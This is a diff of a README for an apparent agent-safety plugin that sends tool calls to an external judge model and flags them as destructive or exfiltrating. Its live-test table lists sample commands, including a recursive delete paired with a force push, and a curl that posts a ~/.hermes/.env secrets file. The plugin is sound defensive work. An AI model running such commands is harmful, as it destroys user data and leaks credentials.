@@ -8,17 +8,23 @@ Adapted from [pi-jev](https://github.com/y0usaf/pi-jev) (Pi coding agent) to
 Hermes hooks. Two routes, picked by the `backend` setting (`auto` by
 default: `TYPESAFE_API_KEY` wins, else `AI_GATEWAY_API_KEY`):
 
-| Route | Endpoint | Key | Questions | Confidence | Cost |
-| ----- | -------- | --- | --------- | ---------- | ---- |
-| TypeSafe direto | `POST https://api.typesafe.ai/v1/systemone` (`model: jev-latest`) | `TYPESAFE_API_KEY` | `noul` / `choice` / `score` | inline per answer | none (`usage` in tokens) |
-| Vercel AI Gateway | `POST {jev_base_url}/evaluation-model` (`typesafe-ai/jev`) | `AI_GATEWAY_API_KEY` | `boolean` / `choice` / `score` | `providerMetadata.typesafe.confidence` | `providerMetadata.gateway.cost` |
+| Route             | Endpoint                                                          | Key                  | Questions                      | Confidence                             | Cost                            |
+| ----------------- | ----------------------------------------------------------------- | -------------------- | ------------------------------ | -------------------------------------- | ------------------------------- |
+| TypeSafe direto   | `POST https://api.typesafe.ai/v1/systemone` (`model: jev-latest`) | `TYPESAFE_API_KEY`   | `noul` / `choice` / `score`    | inline per answer                      | none (`usage` in tokens)        |
+| Vercel AI Gateway | `POST {jev_base_url}/evaluation-model` (`typesafe-ai/jev`)        | `AI_GATEWAY_API_KEY` | `boolean` / `choice` / `score` | `providerMetadata.typesafe.confidence` | `providerMetadata.gateway.cost` |
 
 Yes/no questions are `boolean` internally and mapped to `noul` on the
 TypeSafe wire; answers come back normalized (`{probability}` /
 `{choice, probabilities, confidence}` / `{score, probabilities, confidence}`).
 Pure stdlib, no Node needed.
 
-Rota TypeSafe implementada conforme a doc; ainda não exercitada ao vivo (sem chave disponível).
+Exercitada ao vivo nos dois backends (2026-09-21, mesma bateria de 3 calls):
+
+| Tool call                                          | TypeSafe direto                                              | Gateway                     |
+| -------------------------------------------------- | ------------------------------------------------------------ | --------------------------- |
+| `rm -rf ~/projetos/hermes-jev && git push --force` | destructive 0.95 · exfiltration 0.84 · impact 2.63 (1181 ms) | 0.95 · 0.83 · 2.60 (464 ms) |
+| `ls -la ~/projetos/hermes-jev/plugins`             | clear (1010 ms)                                              | clear (411 ms)              |
+| `curl -X POST … -d @~/.hermes/.env`                | exfiltration 0.97 · impact 2.98 (866 ms)                     | 0.97 · 2.98 (352 ms)        |
 
 ## What it does
 
@@ -60,23 +66,23 @@ retry can take up to ~2×`timeout_s` + `retry_max_wait_s` (~8s at defaults).
 
 `plugins.entries.jev-judge.settings` in `config.yaml`:
 
-| Key                      | Default                            | Meaning                                                    |
-| ------------------------ | ---------------------------------- | ---------------------------------------------------------- |
-| `mode`                   | `shadow`                           | `shadow` = log only · `enforce` = escalate triggered calls |
-| `tools`                  | `[terminal, write_file, patch]`    | Tools the gate judges                                      |
-| `timeout_s`              | `3.0`                              | Per-attempt timeout (worst case per call: 2×`timeout_s` + `retry_max_wait_s`) |
-| `cache_seconds`          | `300`                              | Identical calls judged once per window                     |
-| `backend`                | `auto`                             | `auto` = TypeSafe key wins, else gateway · `typesafe`/`gateway` forces one |
-| `typesafe_model` / `typesafe_base_url` | `jev-latest` / `https://api.typesafe.ai` | TypeSafe direto endpoint overrides |
-| `retry_max_wait_s`       | `2.0`                              | Retry once on 429/529 only if Retry-After waits at most this |
-| `breaker_threshold`      | `3`                                | Consecutive 429/529s before going silent                   |
-| `breaker_cooldown_s`     | `120`                              | Silence window after the breaker opens                     |
-| `min_interval_s`         | `0.25`                             | Minimum gap between outgoing Jev calls, per process        |
-| `destructive_threshold`  | `0.90`                             | P(true) that triggers                                      |
-| `exfiltration_threshold` | `0.70`                             | P(true) that triggers                                      |
-| `impact_threshold`       | `2.5`                              | Score that triggers (0–3 scale)                            |
-| `jev_model` / `jev_base_url` | `typesafe-ai/jev` / AI Gateway | Gateway endpoint overrides (prefixed: the loader rejects bare `model`/`base_url`, root is reserved) |
-| `log_path`               | `<HERMES_HOME>/logs/jev-judge.log` | JSONL decision log                                         |
+| Key                                    | Default                                  | Meaning                                                                                             |
+| -------------------------------------- | ---------------------------------------- | --------------------------------------------------------------------------------------------------- |
+| `mode`                                 | `shadow`                                 | `shadow` = log only · `enforce` = escalate triggered calls                                          |
+| `tools`                                | `[terminal, write_file, patch]`          | Tools the gate judges                                                                               |
+| `timeout_s`                            | `3.0`                                    | Per-attempt timeout (worst case per call: 2×`timeout_s` + `retry_max_wait_s`)                       |
+| `cache_seconds`                        | `300`                                    | Identical calls judged once per window                                                              |
+| `backend`                              | `auto`                                   | `auto` = TypeSafe key wins, else gateway · `typesafe`/`gateway` forces one                          |
+| `typesafe_model` / `typesafe_base_url` | `jev-latest` / `https://api.typesafe.ai` | TypeSafe direto endpoint overrides                                                                  |
+| `retry_max_wait_s`                     | `2.0`                                    | Retry once on 429/529 only if Retry-After waits at most this                                        |
+| `breaker_threshold`                    | `3`                                      | Consecutive 429/529s before going silent                                                            |
+| `breaker_cooldown_s`                   | `120`                                    | Silence window after the breaker opens                                                              |
+| `min_interval_s`                       | `0.25`                                   | Minimum gap between outgoing Jev calls, per process                                                 |
+| `destructive_threshold`                | `0.90`                                   | P(true) that triggers                                                                               |
+| `exfiltration_threshold`               | `0.70`                                   | P(true) that triggers                                                                               |
+| `impact_threshold`                     | `2.5`                                    | Score that triggers (0–3 scale)                                                                     |
+| `jev_model` / `jev_base_url`           | `typesafe-ai/jev` / AI Gateway           | Gateway endpoint overrides (prefixed: the loader rejects bare `model`/`base_url`, root is reserved) |
+| `log_path`                             | `<HERMES_HOME>/logs/jev-judge.log`       | JSONL decision log                                                                                  |
 
 Needs `TYPESAFE_API_KEY` (direct) and/or `AI_GATEWAY_API_KEY` (Vercel AI
 Gateway). No key at all: the plugin loads and stays silent (fail-open).
